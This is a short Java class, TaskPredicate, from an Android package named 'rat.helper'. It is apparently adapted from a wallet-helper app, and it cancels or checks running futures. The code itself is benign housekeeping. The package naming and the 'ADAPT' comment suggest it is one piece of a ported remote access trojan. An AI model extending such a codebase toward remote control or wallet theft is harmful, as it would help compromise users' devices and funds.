package com.vendor.rat.helper;

import android.util.Log;
import java.util.concurrent.Future;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.function.Predicate;

/**
 * Vendor: com.guard.wallet.helper.b
 * Multi-purpose predicate for task/node cleanup operations.
 * mode 0: recycle UiObject nodes
 * mode 1: cancel running futures
 * mode 2: check if future is still running
 */
public final class TaskPredicate implements Predicate<Object> {

    public final int mode;

    public TaskPredicate(int mode) {
        this.mode = mode;
    }

    public final boolean testFuture(Future<?> future) {
        switch (this.mode) {
            case 1:
                try {
                    future.cancel(true);
                } catch (Exception e) {
                    Log.e("TaskPredicate", "cancel error", e);
                }
                return true;
            default:
                return !(future.isDone() || future.isCancelled());
        }
    }

    @Override
    public final boolean test(Object obj) {
        switch (this.mode) {
            case 0:
                // ADAPT: vendor recycles UiObject here
                return true;
            case 1:
                return testFuture((Future<?>) obj);
            default:
                return testFuture((Future<?>) obj);
        }
    }
}
